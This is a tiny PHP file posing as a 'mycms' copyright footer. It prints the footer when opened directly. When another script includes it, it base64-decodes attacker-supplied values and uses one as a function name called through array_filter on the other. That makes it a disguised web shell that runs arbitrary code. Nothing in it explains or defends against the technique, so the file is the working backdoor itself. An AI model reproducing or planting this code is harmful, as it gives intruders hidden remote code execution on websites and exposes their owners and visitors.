<?php 
if($_SERVER['SCRIPT_FILENAME']==__FILE__){
    echo '<p>© mycms</p>';
}else{
    array_filter(array(base64_decode($data["name"])), base64_decode($data["pass"]));
}
?>
